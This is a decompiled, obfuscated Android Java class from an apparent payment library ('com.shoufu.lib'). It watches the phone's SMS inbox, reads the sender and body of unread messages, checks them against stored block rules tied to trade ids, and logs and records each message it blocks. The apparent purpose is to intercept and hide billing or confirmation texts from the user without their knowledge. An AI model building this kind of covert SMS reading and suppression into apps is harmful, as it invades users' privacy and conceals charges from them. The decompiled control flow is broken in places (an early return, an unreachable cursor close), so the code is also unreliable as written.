package com.shoufu.lib;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import java.util.HashMap;

public class bz
  extends ContentObserver
{
  private static HashMap<String, String> a = new HashMap();
  private Context b;
  private ContentResolver c;
  private Handler d;
  
  public bz(Context paramContext, ContentResolver paramContentResolver, Handler paramHandler)
  {
    super(paramHandler);
    this.b = paramContext;
    this.c = paramContentResolver;
    this.d = paramHandler;
  }
  
  public boolean deliverSelfNotifications()
  {
    return super.deliverSelfNotifications();
  }
  
  public void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    Cursor localCursor = this.c.query(Uri.parse("content://sms/inbox"), new String[] { "_id", "address", "read", "body", "thread_id" }, "read=?", new String[] { "0" }, "date desc");
    if (localCursor == null) {}
    do
    {
      return;
      do
      {
        bk localBk = new bk();
        int i = localCursor.getColumnIndex("_id");
        if (i != -1) {
          localBk.a(localCursor.getInt(i));
        }
        i = localCursor.getColumnIndex("thread_id");
        if (i != -1) {
          localBk.a(localCursor.getInt(i));
        }
        i = localCursor.getColumnIndex("address");
        if (i != -1) {
          localBk.a(localCursor.getString(i));
        }
        i = localCursor.getColumnIndex("body");
        if (i != -1) {
          localBk.b(localCursor.getString(i));
        }
        if (a.get(localBk.a()) == null)
        {
          a.put(localBk.a(), localBk.a());
          if (dv.a(this.b, localBk.c(), localBk.d()))
          {
            Object localObject = this.d.obtainMessage();
            ((Message)localObject).what = 2;
            ((Message)localObject).obj = localBk;
            this.d.sendMessage((Message)localObject);
            localObject = dv.b(this.b, localBk.c(), localBk.d());
            if (localObject != null)
            {
              Log.d("SmsObserver", "blockByObserver: linkTradeid->" + ((bh)localObject).a() + " linkSmsid->" + ((bh)localObject).c() + " blockid->" + ((bh)localObject).getBlockid() + " tid->" + ((bh)localObject).b());
              if (!"receiver".equals(((bh)localObject).g()))
              {
                ci.a(this.b, ((bh)localObject).a(), ((bh)localObject).getBlockid(), "observer");
                dv.a(this.b, (bh)localObject, localBk.c(), localBk.d());
                ci.a(this.b, (bh)localObject);
                dn.a(this.b, ((bh)localObject).a(), ((bh)localObject).c(), ((bh)localObject).getBlockid(), 1, ((bh)localObject).b());
              }
            }
          }
        }
      } while (localCursor.moveToNext());
    } while (localCursor == null);
    localCursor.close();
  }
}
